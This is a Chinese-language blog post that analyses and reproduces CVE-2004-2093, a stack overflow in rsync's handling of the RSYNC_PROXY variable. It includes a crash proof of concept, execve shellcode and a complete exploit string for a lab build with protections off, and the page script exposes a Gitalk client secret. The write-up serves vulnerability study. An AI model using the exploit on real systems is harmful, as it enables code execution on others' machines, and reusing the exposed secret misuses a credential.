<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="CVE Binary PWN hacker web security angr rex ida hack code python github hexo"><title>CVE-2004-2093(rsync)缓冲区溢出漏洞分析与复现 | Mr.Ma3k4H3d</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/8.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">CVE-2004-2093(rsync)缓冲区溢出漏洞分析与复现</h1><a id="logo" href="/.">Mr.Ma3k4H3d</a><p class="description">竹杖芒鞋轻胜马，一蓑烟雨任平生。</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="https://micro8.github.io/Micro8-HTML/"><i class="fa fa-archive"> Micro8</i></a><a href="https://ma3k4h3d.top/Papers/"><i class="fa fa-archive"> Papers</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/history/"><i class="fa fa-user"> 关于</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">CVE-2004-2093(rsync)缓冲区溢出漏洞分析与复现</h1><div class="post-meta">Mar 19, 2019<span> | </span><span class="category"><a href="/categories/漏洞分析/">漏洞分析</a></span><script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span><span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 1k</span><span class="post-meta-item-text"> 字</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-hourglass-half"></i><span class="post-count"> 5</span><span class="post-meta-item-text"> 分钟</span></span></span></div><div class="post-content"><p>Rsync is a fast and extraordinarily versatile file copying tool. It can copy locally, to/from another host over any remote shell, or to/from a remote rsync daemon. It offers a large number of options that control every aspect of its behavior and permit very flexible specification of the set of files to be copied. It is famous for its delta-transfer algorithm, which reduces the amount of data sent over the network by sending only the differences between the source files and the existing files in the destination. Rsync is widely used for backups and mirroring and as an improved copy command for everyday use.</p>
<a id="more"></a>
<p>Rsync finds files that need to be transferred using a “quick check” algorithm (by default) that looks for files that have changed in size or in last-modified time. Any changes in the other preserved attributes (as requested by options) are made on the destination file directly when the quick check indicates that the file’s data does not need to be updated.</p>
<p>Some of the additional features of rsync are:</p>
<ul>
<li>support for copying links, devices, owners, groups, and permissions</li>
<li>exclude and exclude-from options similar to GNU tar</li>
<li>a CVS exclude mode for ignoring the same files that CVS would ignore</li>
<li>can use any transparent remote shell, including ssh or rsh</li>
<li>does not require super-user privileges</li>
<li>pipelining of file transfers to minimize latency costs</li>
<li>support for anonymous or authenticated rsync daemons (ideal for mirroring)</li>
</ul>
<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p><img src="/2019/03/19/CVE-2004-2093/CVE-Details_min.png" alt="">  </p>
<h2 id="0x02-CVE-2004-2093-漏洞原理"><a href="#0x02-CVE-2004-2093-漏洞原理" class="headerlink" title="0x02 CVE-2004-2093 漏洞原理"></a>0x02 CVE-2004-2093 漏洞原理</h2><h3 id="1、源码"><a href="#1、源码" class="headerlink" title="1、源码"></a>1、源码</h3><p>溢出点位于 socket.c 文件中的 open_socket_out() 函数内。漏洞产生的原因在于，程序读入环境变量 RSYNC_PROXY 时未检查缓冲区边界。当使用 rsync 连接远程  deamon 服务器时会触发漏洞。rsync 手册中对 “CONNECTING TO AN RSYNC DAEMON” 的描述如下：  </p>
<hr>
<p><strong>CONNECTING TO AN RSYNC DAEMON</strong><br>It is also possible to use rsync without a remote shell as the transport. In this case you will directly connect to a remote rsync daemon, typically using TCP port 873. (This obviously requires the daemon to be running on the remote system, so refer to the STARTING AN RSYNC DAEMON TO ACCEPT CONNECTIONS section below for information on that.)</p>
<p>Using rsync in this way is the same as using it with a remote shell except that:</p>
<ul>
<li>you either use a double colon :: instead of a single colon to separate the hostname from the path, or you use an rsync:// URL.</li>
<li>the first word of the “path” is actually a module name.</li>
<li>the remote daemon may print a message of the day when you connect.</li>
<li>if you specify no path name on the remote daemon then the list of accessible paths on the daemon will be shown.</li>
<li>if you specify no local destination then a listing of the specified files on the remote daemon is provided.</li>
<li><p>you must not specify the –rsh (-e) option.<br>An example that copies all the files in a remote module named “src”:</p>
<p>  rsync -av host::src /dest</p>
</li>
</ul>
<hr>
<p>open_socket_out() 函数如下：</p>
<p><img src="/2019/03/19/CVE-2004-2093/code_min.png" alt=""></p>
<h3 id="2、汇编"><a href="#2、汇编" class="headerlink" title="2、汇编"></a>2、汇编</h3><p>溢出点处，strcpy() 的目的地址为 portbuf[10]。查看汇编代码，portbuf 地址为 RBP - 0x7a，因此偏移量为 0x7a。  </p>
<p><img src="/2019/03/19/CVE-2004-2093/asm_min.png" alt=""></p>
<h3 id="3、Debug"><a href="#3、Debug" class="headerlink" title="3、Debug"></a>3、Debug</h3><p>基于以上分析，尝试构造 PoC，构造条件为</p>
<ul>
<li>PoC 中需包含字符 “:”</li>
<li>“:” 后的数据为 122 字节（0x7a）</li>
<li>122 字节后追加 6 字节，覆盖 RIP。<br>最终 PoC 为：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'print "AAAA:" + "A"*122 + "BBBBBB"'</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>通过 GDB 进行调试，运行参数为：run -av localhost::src /dest。使用 set environment RSYNC_PROXY=PoC 将 PoC 传入。</p>
<p>在 &lt; open_socket_out+229 > 处设置断点，即溢出点前。查看程序运行状态如下：</p>
<p><img src="/2019/03/19/CVE-2004-2093/stack_min.png" alt="">  </p>
<p>使用命令 “ni” 单步执行，触发溢出。  </p>
<p><img src="/2019/03/19/CVE-2004-2093/stack_smash_min.png" alt=""></p>
<p>可见，RIP 被覆盖为 0x0000424242424242。执行至 open_socket_out() 返回，触发异常：  </p>
<p><img src="/2019/03/19/CVE-2004-2093/crash_min.png" alt=""></p>
<p>控制流已被成功劫持。完整过程如下：  </p>
<p><img src="/2019/03/19/CVE-2004-2093/PoC_min.gif" alt="">  </p>
<h2 id="0x02-Exploit"><a href="#0x02-Exploit" class="headerlink" title="0x02 Exploit"></a>0x02 Exploit</h2><p>通过 ret2text 的方式，在实验环境下实现任意代码执行。</p>
<h3 id="1、实验环境"><a href="#1、实验环境" class="headerlink" title="1、实验环境"></a>1、实验环境</h3><p>修改原 Makefile 文件中的 gcc 选项，关闭安全机制：  </p>
<p><img src="/2019/03/19/CVE-2004-2093/gcc_min.png" alt=""></p>
<p>checksec 结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">'/root/AEG_DataSet/rsync-2.5.7/rsync'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></p>
<p>使用 shellcode 如下，功能为调用 /bin/bash，共计 24 字节。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 调用 /bin/bash (<span class="number">24</span> byte)</span><br><span class="line">shellcode = <span class="string">'\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05'</span></span><br></pre></td></tr></table></figure></p>
<h3 id="2、GDB"><a href="#2、GDB" class="headerlink" title="2、GDB"></a>2、GDB</h3><p>基于上文分析，使用 retAddr = 0x7fffffffe1fe，构造 Exp 如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'AAAA:'</span> + <span class="string">'\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05'</span> + <span class="string">'A'</span>*98 + <span class="string">'\xfe\xe1\xff\xff\xff\x7f'</span><span class="string">")</span></span><br></pre></td></tr></table></figure></p>
<p>使用 export 命令将 Exp 写入环境变量：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> RSYNC_PROXY=<span class="string">"`python -c 'print "</span>AAAA:<span class="string">"+"</span>\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05<span class="string">" + "</span>A<span class="string">"*98 + "</span>\xfe\xe1\xff\xff\xff\x7f<span class="string">"'`"</span></span><br></pre></td></tr></table></figure></p>
<p>使用 GDB 加载并执行 rsync，在 &lt; open_socket_out+234 > 处设置断点，并查看程序状态：</p>
<p><img src="/2019/03/19/CVE-2004-2093/gdb_exp_stack_min.png" alt=""></p>
<p>执行至 open_socket_out() 返回，控制流被劫持，跳转至 shellcode 并执行。  </p>
<p><img src="/2019/03/19/CVE-2004-2093/gdb_shellcode_min.png" alt=""></p>
<p>至此，完成了对 CVE-2004-2093 的分析，并在实验环境下编写了 Exploit。</p>
<h2 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h2><ol>
<li><a href="https://rsync.samba.org/download.html" target="_blank" rel="noopener">rsync download</a></li>
<li><a href="https://download.samba.org/pub/rsync/rsync.html" target="_blank" rel="noopener">rsync doc</a></li>
<li><a href="https://www.cvedetails.com/cve/CVE-2004-2093/" target="_blank" rel="noopener">Vulnerability Details : CVE-2004-2093</a></li>
</ol>
</div><iframe src="/donate/?AliPayQR=null&amp;WeChatQR=/img/qr.jpeg&amp;GitHub=https://github.com/Ma3k4H3d&amp;BTCQR=null&amp;BTCKEY=null&amp;PayPal=null" style="overflow-x:hidden; overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Mr.Ma3k4H3d</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="/2019/03/19/CVE-2004-2093/">http://maskhed.github.io/2019/03/19/CVE-2004-2093/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章均为原创，采用 CC BY-NC-SA 4.0 CN。转载请注明出处！</li></ul></div><br><div class="tags"></div><div class="post-nav"><a class="pre" href="/2019/03/28/rex-1/">Exploit 自动生成引擎 Rex</a><a class="next" href="/2019/03/15/CVE-2001-1413/">CVE-2001-1413(nCompress) 缓冲区溢出漏洞分析及复现</a></div><div id="container"></div><link rel="stylesheet" type="text/css" href="//unpkg.com/gitalk/dist/gitalk.css?v=0.0.0"><script type="text/javascript" src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js?v=0.0.0"></script><script type="text/javascript" src="//unpkg.com/gitalk/dist/gitalk.min.js?v=0.0.0"></script><script type="text/javascript" src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script><script>var gitalk = new Gitalk({
  clientID: '5a30c862e87dbcdd2992',
  clientSecret: 'e098ba3d824802e68648008f80b024617bd8a546',
  repo: 'ma3k4h3d.github.io',
  owner: 'Ma3k4H3d',
  admin: ['Ma3k4H3d'],
  distractionFreeMode: false
})
gitalk.render('container')
</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AEG/">AEG</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Angr/">Angr</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/技术分享/">技术分享</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞分析/">漏洞分析</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/随笔杂谈/">随笔杂谈</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/Hexo/" style="font-size: 15px;">Hexo</a> <a href="/tags/CGC/" style="font-size: 15px;">CGC</a> <a href="/tags/Mr-Robot/" style="font-size: 15px;">Mr.Robot</a> <a href="/tags/CVE/" style="font-size: 15px;">CVE</a> <a href="/tags/SS/" style="font-size: 15px;">SS</a> <a href="/tags/Github/" style="font-size: 15px;">Github</a> <a href="/tags/Fuzz/" style="font-size: 15px;">Fuzz</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/12/08/风雨兼程/">即使风雨兼程，也能守得云开见月明</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/29/AEG-papers/">AEG Papers</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/29/OSVDB-16373-glFTPd/">OSVDB-ID#16373（glFTPd）栈溢出漏洞分析与复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/28/rex-1/">Exploit 自动生成引擎 Rex</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/19/CVE-2004-2093/">CVE-2004-2093(rsync)缓冲区溢出漏洞分析与复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/15/CVE-2001-1413/">CVE-2001-1413(nCompress) 缓冲区溢出漏洞分析及复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/14/CVE-2003-0947/">CVE-2003-0947(iwconfig)缓冲区溢出分析及复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/23/rex-crash/">Rex：源码分析 -- Crash Analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/17/Rex-stacksmash/">Rex AEG：栈溢出之 Exploit 自动生成</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/09/insomnihack-aeg/">angr AEG：缓冲区溢出之 Exploit 自动生成</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.t00ls.net/" title="T00ls" target="_blank">T00ls</a><ul></ul><a href="http://riusksk.me" title="riusksk" target="_blank">riusksk</a><ul></ul><a href="https://micropoor.blogspot.com" title="Micropoor" target="_blank">Micropoor</a><ul></ul><a href="http://www.cnblogs.com/backlion" title="Backlion" target="_blank">Backlion</a><ul></ul><a href="https://onebugman.com" title="OneBugMan" target="_blank">OneBugMan</a><ul></ul><a href="http://yama0xff.com" title="yama0xff.com" target="_blank">yama0xff.com</a><ul></ul><a href="https://musicforprogramming.net" title="musicforprogramming.net" target="_blank">musicforprogramming.net</a><ul></ul><a href="https://book.douban.com/annual/2018?source=navigation" title="好书精选" target="_blank">好书精选</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer"><div>Total<span id="busuanzi_container_site_pv"><span> </span><span id="busuanzi_value_site_pv"></span></span><span rel="nofollow">  hits, </span><span id="busuanzi_container_site_uv"><span id="busuanzi_value_site_uv"></span></span><span rel="nofollow">  visitors. </span></div><div><script>var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1275288791'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s23.cnzz.com/z_stat.php%3Fid%3D1275288791%26online%3D1%26show%3Dline' type='text/javascript'%3E%3C/script%3E"));</script></div>Copyright © 2019 <a href="/." rel="nofollow">Mr.Ma3k4H3d.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="/js/search.js?v=0.0.0"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
   search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" color="208,55,66" opacity="0.3" zindex="-1" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>